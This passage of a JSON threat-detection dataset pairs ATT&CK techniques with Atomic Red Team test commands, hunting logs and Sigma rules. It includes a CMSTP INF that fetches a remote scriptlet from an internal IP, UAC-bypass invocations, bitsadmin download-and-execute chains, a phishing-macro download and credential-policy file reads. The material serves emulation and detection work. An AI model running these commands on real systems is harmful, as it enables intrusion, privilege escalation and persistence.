["https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/"], "date": "2018/04/11", "author": "Karneades", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection_reg1": {"EventID": 13, "TargetObject": ["*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\\*\\GlobalFlag", "*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\\\*\\ReportingMode", "*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\\\*\\MonitorProcess"], "EventType": "SetValue"}, "condition": "selection_reg1"}, "tags": ["attack.privilege_escalation", "attack.persistence", "attack.defense_evasion", "attack.t1183", "car.2013-01-002"], "falsepositives": ["unknown"], "level": "critical"}}]}, {"technique_id": "T1191", "commands": [{"source": "atomics/T1191/T1191.yaml", "command": "cmstp.exe /s PathToAtomicsFolder\\T1191\\src\\T1191.inf\n", "name": null}, {"source": "atomics/T1191/T1191.yaml", "command": "cmstp.exe /s PathToAtomicsFolder\\T1191\\src\\T1191_uacbypass.inf /au\n", "name": null}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmstp.exe", "name": "sub_process_1"}, {"source": "SysmonHunter - CMSTP", "command": "cmstp.exe/s|/ns|/au", "name": null}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\nwindows security log\nEvent ID: 4688\nProcess information:\nNew Process ID: 0x9b0\nNew Process Name: C: \\ Windows \\ System32 \\ cmstp.exe\n\nsysmon log\nEvent ID: 1\nOriginalFileName: CMSTP.EXE\nCommandLine: cmstp.exe / ni / s C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ add.inf\nCurrentDirectory: C: \\ Windows \\ system32 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}\nLogonId: 0x6e1ea\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1 = BA135738EF1FB2F4C2C6C610BE2C4E855A526668\nParentProcessGuid: {bb1f7c32-fdb7-5e9a-0000-0010563b2d00}\nParentProcessId: 1988\nParentImage: C: \\ Windows \\ System32 \\ cmd.exe\nParentCommandLine: \"C: \\ Windows \\ System32 \\ cmd.exe\"", "name": "Log"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "## inf file contents", "name": "## inf file contents"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Inf\n[Version]\nSignature = $ chicago $\nAdvancedINF = 2.5\n[DefaultInstall_SingleUser]\nUnRegisterOCXs = UnRegisterOCXSection\n[UnRegisterOCXSection]\n% 11% \\ scrobj.dll, NI, http: //192.168.1.4/cmstp_rev_53_x64.sct\n[Strings]\nAppAct = \"SOFTWARE \\ Microsoft \\ Connection Manager\"\nServiceName = \"Micropoor\"\nShortSvcName = \"Micropoor\"", "name": "Inf"}], "parsed_datasets": [{"Atomic Red Team Test - CMSTP": {"attack_technique": "T1191", "display_name": "CMSTP", "atomic_tests": [{"name": "CMSTP Executing Remote Scriptlet", "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n", "supported_platforms": ["windows"], "input_arguments": {"inf_file_path": {"description": "Path to the INF file", "type": "path", "default": "PathToAtomicsFolder\\T1191\\src\\T1191.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "INF file must exist on disk at specified location (#{inf_file_path})\n", "prereq_command": "if (Test-Path #{inf_file_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_file_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191.inf\" -OutFile \"#{inf_file_path}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "cmstp.exe /s #{inf_file_path}\n"}}, {"name": "CMSTP Executing UAC Bypass", "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n", "supported_platforms": ["windows"], "input_arguments": {"inf_file_uac": {"description": "Path to the INF file", "type": "path", "default": "PathToAtomicsFolder\\T1191\\src\\T1191_uacbypass.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "INF file must exist on disk at specified location (#{inf_file_uac})\n", "prereq_command": "if (Test-Path #{inf_file_uac}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_file_uac}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191_uacbypass.inf\" -OutFile \"#{inf_file_uac}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "cmstp.exe /s #{inf_file_uac} /au\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100210", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "cmstp.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "cmstp", "mitre_attack": "T1191", "itw_sample": ""}}, {"SysmonHunter - T1191": {"name": "CMSTP", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"image": {"pattern": "cmstp.exe"}, "cmdline": {"pattern": "/s|/ns|/au"}}}]}}], "command_list": ["cmstp.exe /s PathToAtomicsFolder\\T1191\\src\\T1191.inf\n", "cmstp.exe /s PathToAtomicsFolder\\T1191\\src\\T1191_uacbypass.inf /au\n", "winword.exe", "cmstp.exe", "cmstp.exe/s|/ns|/au", "Log\nwindows security log\nEvent ID: 4688\nProcess information:\nNew Process ID: 0x9b0\nNew Process Name: C: \\ Windows \\ System32 \\ cmstp.exe\n\nsysmon log\nEvent ID: 1\nOriginalFileName: CMSTP.EXE\nCommandLine: cmstp.exe / ni / s C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ add.inf\nCurrentDirectory: C: \\ Windows \\ system32 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}\nLogonId: 0x6e1ea\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1 = BA135738EF1FB2F4C2C6C610BE2C4E855A526668\nParentProcessGuid: {bb1f7c32-fdb7-5e9a-0000-0010563b2d00}\nParentProcessId: 1988\nParentImage: C: \\ Windows \\ System32 \\ cmd.exe\nParentCommandLine: \"C: \\ Windows \\ System32 \\ cmd.exe\"", "## inf file contents", "Inf\n[Version]\nSignature = $ chicago $\nAdvancedINF = 2.5\n[DefaultInstall_SingleUser]\nUnRegisterOCXs = UnRegisterOCXSection\n[UnRegisterOCXSection]\n% 11% \\ scrobj.dll, NI, http: //192.168.1.4/cmstp_rev_53_x64.sct\n[Strings]\nAppAct = \"SOFTWARE \\ Microsoft \\ Connection Manager\"\nServiceName = \"Micropoor\"\nShortSvcName = \"Micropoor\""], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and process_path contains \"CMSTP.exe\"", "name": "CMSTP"}], "possible_detections": [{"data_source": {"action": "global", "title": "CMSTP Execution", "id": "9d26fede-b526-4413-b069-6e24b6d07167", "status": "stable", "description": "Detects various indicators of Microsoft Connection Manager Profile Installer execution", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1191", "attack.g0069", "car.2019-04-001"], "author": "Nik Seetharaman", "references": ["http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/"], "detection": {"condition": "1 of them"}, "fields": ["CommandLine", "ParentCommandLine", "Details"], "falsepositives": ["Legitimate CMSTP use (unlikely in modern enterprise environments)"], "level": "high"}}, {"data_source": {"logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection2": {"EventID": 12, "TargetObject": "*\\cmmgr32.exe*"}, "selection3": {"EventID": 13, "TargetObject": "*\\cmmgr32.exe*"}, "selection4": {"EventID": 10, "CallTrace": "*cmlua.dll*"}}}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"ParentImage": "*\\cmstp.exe"}}}}, {"data_source": {"title": "CMSTP UAC Bypass via COM Object Access", "id": "4b60e6f2-bf39-47b4-b4ea-398e33cfe253", "status": "stable", "description": "Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.execution", "attack.t1088", "attack.t1191", "attack.g0069", "car.2019-04-001"], "author": "Nik Seetharaman", "modified": "2019/07/31", "references": ["http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/", "https://twitter.com/hFireF0X/status/897640081053364225"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"ParentCommandLine": "*\\DllHost.exe"}, "selection2": {"ParentCommandLine": ["*{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", "*{3E000D72-A845-4CD9-BD83-80C07C3B881F}"]}, "condition": "selection1 and selection2"}, "fields": ["CommandLine", "ParentCommandLine", "Hashes"], "falsepositives": ["Legitimate CMSTP use (unlikely in modern enterprise environments)"], "level": "high"}}]}, {"technique_id": "T1193", "commands": [{"source": "atomics/T1193/T1193.yaml", "command": "if (-not(Test-Path HKLM:SOFTWARE\\Classes\\Excel.Application)){\n  return 'Please install Microsoft Excel before running this test.'\n}\nelse{\n  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'\n  $fileName = 'PhishingAttachment.xlsm'\n  New-Item -Type File -Force -Path $fileName | out-null\n  $wc = New-Object System.Net.WebClient\n  $wc.Encoding = [System.Text.Encoding]::UTF8\n  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n  ($wc.DownloadString(\"$url\")) | Out-File $fileName\n}\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Spearphishing Attachment": {"attack_technique": "T1193", "display_name": "Spearphishing Attachment", "atomic_tests": [{"name": "Download Phishing Attachment - VBScript", "description": "The macro-enabled Excel file contains VBScript which opens your default web browser and opens it to [google.com](http://google.com).\nThe below will successfully download the macro-enabled Excel file to the current location.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "if (-not(Test-Path HKLM:SOFTWARE\\Classes\\Excel.Application)){\n  return 'Please install Microsoft Excel before running this test.'\n}\nelse{\n  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'\n  $fileName = 'PhishingAttachment.xlsm'\n  New-Item -Type File -Force -Path $fileName | out-null\n  $wc = New-Object System.Net.WebClient\n  $wc.Encoding = [System.Text.Encoding]::UTF8\n  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n  ($wc.DownloadString(\"$url\")) | Out-File $fileName\n}\n"}}]}}], "command_list": ["if (-not(Test-Path HKLM:SOFTWARE\\Classes\\Excel.Application)){\n  return 'Please install Microsoft Excel before running this test.'\n}\nelse{\n  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'\n  $fileName = 'PhishingAttachment.xlsm'\n  New-Item -Type File -Force -Path $fileName | out-null\n  $wc = New-Object System.Net.WebClient\n  $wc.Encoding = [System.Text.Encoding]::UTF8\n  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n  ($wc.DownloadString(\"$url\")) | Out-File $fileName\n}\n"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Suspicious HWP Sub Processes", "id": "023394c4-29d5-46ab-92b8-6a534c6f447b", "description": "Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation", "status": "experimental", "references": ["https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/", "https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5&from_sample=5db135000388385a7644131f&block_redirect=1", "https://twitter.com/cyberwar_15/status/1187287262054076416", "https://blog.alyac.co.kr/1901", "https://en.wikipedia.org/wiki/Hangul_(word_processor)"], "tags": ["attack.execution", "attack.defense_evasion", "attack.initial_access", "attack.t1059", "attack.t1202", "attack.t1193", "attack.g0032"], "author": "Florian Roth", "date": "2019/10/24", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": "*\\Hwp.exe", "Image": "*\\gbb.exe"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Suspicious Double Extension", "id": "1cdd9a09-06c9-4769-99ff-626e2b3991b8", "description": "Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns", "references": ["https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html", "https://twitter.com/blackorbird/status/1140519090961825792"], "author": "Florian Roth (rule), @blu3_team (idea)", "date": "2019/06/26", "tags": ["attack.initial_access", "attack.t1193"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*.doc.exe", "*.docx.exe", "*.xls.exe", "*.xlsx.exe", "*.ppt.exe", "*.pptx.exe", "*.rtf.exe", "*.pdf.exe", "*.txt.exe", "*      .exe", "*______.exe"]}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"title": "Execution in Outlook Temp Folder", "id": "a018fdc3-46a3-44e5-9afb-2cd4af1d4b39", "status": "experimental", "description": "Detects a suspicious program execution in Outlook temp folder", "author": "Florian Roth", "date": "2019/10/01", "tags": ["attack.initial_access", "attack.t1193"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\Temporary Internet Files\\Content.Outlook\\\\*"}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Unknown"], "level": "high"}}]}, {"technique_id": "T1196", "commands": [{"source": "atomics/T1196/T1196.yaml", "command": "control.exe PathToAtomicsFolder\\T1196\\bin\\calc.cpl\n", "name": null}, {"source": "SysmonHunter - Control Panel Items", "command": "\\\\Windows\\\\.+\\\\control.exe", "name": null}, {"source": "SysmonHunter - Control Panel Items", "command": "Shell32.dll,Control_RunDLLAsUser|.cpl", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Control Panel Items": {"attack_technique": "T1196", "display_name": "Control Panel Items", "atomic_tests": [{"name": "Control Panel Items", "description": "This test simulates an adversary leveraging control.exe\nUpon execution calc.exe will be launched\n", "supported_platforms": ["windows"], "input_arguments": {"cpl_file_path": {"description": "path to cpl file", "type": "path", "default": "PathToAtomicsFolder\\T1196\\bin\\calc.cpl"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Cpl file must exist on disk at specified location (#{cpl_file_path})\n", "prereq_command": "if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{cpl_file_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1196/bin/calc.cpl\" -OutFile \"#{cpl_file_path}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "control.exe #{cpl_file_path}\n"}}]}}, {"SysmonHunter - T1196": {"name": "Control Panel Items", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\control.exe", "flag": "regex"}}}, {"type": "process", "process": {"cmdline": {"pattern": "Shell32.dll,Control_RunDLLAsUser|.cpl", "op": "and"}}}]}}], "command_list": ["control.exe PathToAtomicsFolder\\T1196\\bin\\calc.cpl\n", "\\\\Windows\\\\.+\\\\control.exe", "Shell32.dll,Control_RunDLLAsUser|.cpl"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_command_line contains \"control \\\\/name\"or process_commandline contains \"rundll32 shell32.dll,Control_RunDLL\")", "name": "Control Panel Items Process"}, {"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\ControlPanel\\\\NameSpace\"or registry_key_path contains \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Controls Folder\\\\*\\\\Shellex\\\\PropertySheetHandlers\\\\\"or registry_key_path contains \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Control Panel\\\\\")", "name": "Control Panel Items Registry"}], "possible_detections": [{"data_source": {"title": "Control Panel Items", "id": "0ba863e6-def5-4e50-9cea-4dd8c7dc46a4", "status": "experimental", "description": "Detects the use of a control panel item (.cpl) outside of the System32 folder", "reference": ["https://attack.mitre.org/techniques/T1196/"], "tags": ["attack.execution", "attack.t1196", "attack.defense_evasion"], "author": "Kyaw Min Thein", "date": "2019/08/27", "level": "critical", "logsource": {"product": "windows", "category": "process_creation"}, "detection": {"selection": {"CommandLine": "*.cpl"}, "filter": {"CommandLine": ["*\\System32\\\\*", "*%System%*"]}, "condition": "selection and not filter"}, "falsepositives": ["Unknown"]}}]}, {"technique_id": "T1197", "commands": [{"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} %temp%\\bitsadmin_flag.ps1\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination #{local_file}\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination $env:TEMP\\bitsadmin_flag.ps1\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /create AtomicBITS\nbitsadmin.exe /addfile AtomicBITS #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline AtomicBITS #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume AtomicBITS\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} %temp%\\bitsadmin_flag.ps1\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} C:\\Windows\\system32\\notepad.exe #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} %temp%\\bitsadmin_flag.ps1\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "name": null}, {"source": "SysmonHunter - BITS Jobs", "command": "bitsadmin.exe", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - BITS Jobs": {"attack_technique": "T1197", "display_name": "BITS Jobs", "atomic_tests": [{"name": "Bitsadmin Download (cmd)", "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "Remote file to download", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"}, "local_file": {"description": "Local file path to save downloaded file", "type": "path", "default": "%temp%\\bitsadmin_flag.ps1"}}, "executor": {"name": "command_prompt", "command": "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\n", "cleanup_command": "del #{local_file} >nul 2>&1\n"}}, {"name": "Bitsadmin Download (PowerShell)", "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "Remote file to download", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"}, "local_file": {"description": "Local file path to save downloaded file", "type": "path", "default": "$env:TEMP\\bitsadmin_flag.ps1"}}, "executor": {"name": "powershell", "command": "Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}\n", "cleanup_command": "Remove-Item #{local_file} -ErrorAction Ignore\n"}}, {"name": "Persist, Download, & Execute", "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer\nand execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.\n", "supported_platforms": ["windows"], "input_arguments": {"bits_job_name": {"description": "Name of BITS job", "type": "string", "default": "AtomicBITS"}, "remote_file": {"description": "Remote file to download", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"}, "local_file": {"description": "Local file path to save downloaded file", "type": "path", "default": "%temp%\\bitsadmin_flag.ps1"}, "command_path": {"description": "Path of command to execute", "type": "path", "default": "C:\\Windows\\system32\\notepad.exe"}, "command_line": {"description": "Command line to execute", "type": "string", "default": "%temp%\\bitsadmin_flag.ps1"}}, "executor": {"name": "command_prompt", "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n"}}]}}, {"SysmonHunter - T1197": {"name": "BITS Jobs", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"any": {"pattern": "bitsadmin.exe"}}}]}}], "command_list": ["bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}\n", "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} %temp%\\bitsadmin_flag.ps1\n", "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination #{local_file}\n", "Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination $env:TEMP\\bitsadmin_flag.ps1\n", "bitsadmin.exe /create AtomicBITS\nbitsadmin.exe /addfile AtomicBITS #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline AtomicBITS #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume AtomicBITS\n", "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} %temp%\\bitsadmin_flag.ps1\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} C:\\Windows\\system32\\notepad.exe #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} %temp%\\bitsadmin_flag.ps1\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "bitsadmin.exe"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 3and process_path contains \"bitsadmin.exe\"", "name": "BITS Jobs Network"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_path contains \"bitsamin.exe\"or process_command_line contains \"Start-BitsTransfer\")", "name": "BITS Jobs Process"}], "possible_detections": [{"data_source": {"title": "Bitsadmin Download", "id": "d059842b-6b9d-4ed1-b5c3-5b89143c6ede", "status": "experimental", "description": "Detects usage of bitsadmin downloading a file", "references": ["https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin", "https://isc.sans.edu/diary/22264"], "tags": ["attack.defense_evasion", "attack.persistence", "attack.t1197", "attack.s0190"], "author": "Michael Haag", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*\\bitsadmin.exe"], "CommandLine": ["/transfer"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Some legitimate apps use this, but limited."], "level": "medium"}}]}, {"technique_id": "T1201", "commands": [{"source": "atomics/T1201/T1201.yaml", "command": "cat /etc/pam.d/common-password\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "cat /etc/security/pwquality.conf\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "cat /etc/login.defs\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "net accounts\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "net accounts /domain\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "pwpolicy getaccountpolicies", "name": null}, {"source": "data/abilities/discovery/e82f39e2-56f8-4f19-8376-b007f9ac5f8a.yml", "command": {"darwin": {"sh": {"command": "pwpolicy getaccountpolicies\n"}}, "linux": {"sh": {"command": "cat /etc/pam.d/common-password\n"}}, "windows": {"psh": {"command": "net accounts"}}}, "name": "Password Policy Discovery"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_gpo", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_gpo", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ administrator.0DAY> net accounts\nHow long must force users to log off after time expires:? Never\nMinimum password age (days): 1\nMaximum password age (days): 42\nMinimum password length: 7\nKeep the length of the password history: 24\nLockout threshold: Never\nLockout duration (minutes): 30\nLock observation window (minutes): 30\nComputer role: SERVER\nThe command completed successfully.", "name": "Dos"}], "parsed_datasets": [{"Atomic Red Team Test - Password Policy Discovery": {"attack_technique": "T1201", "display_name": "Password Policy Discovery", "atomic_tests": [{"name": "Examine password complexity policy - Ubuntu", "description": "Lists the password complexity policy to console on Ubuntu Linux.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "command": "cat /etc/pam.d/common-password\n"}}, {"name": "Examine password complexity policy - CentOS/RHEL 7.x", "description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n", "supported_platforms": ["linux"], "dependencies": [{"description": "System must be CentOS or RHEL v7\n", "prereq_command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"7\" ]; then exit /b 0; else exit /b 1; fi;\n", "get_prereq_command": "echo Please run from CentOS or RHEL v7\n"}], "executor": {"name": "bash", "command": "cat /etc/security/pwquality.conf\n"}}, {"name": "Examine password complexity policy - CentOS/RHEL 6.x", "description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n", "supported_platforms": ["linux"], "dependencies": [{"description": "System must be CentOS or RHEL v6\n", "prereq_command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then exit /b 0; else exit /b 1; fi;\n", "get_prereq_command": "echo Please run from CentOS or RHEL v6\n"}], "executor": {"name": "bash", "command": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n"}}, {"name": "Examine password expiration policy - All Linux", "description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "command": "cat /etc/login.defs\n"}}, {"name": "Examine local password policy - Windows", "description": "Lists the local password policy to console on Windows.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "net accounts\n"}}, {"name": "Examine domain password policy - Windows", "description": "Lists the domain password policy to console on Windows.\n", "supported_platforms": ["windows"], "executor": {"name": 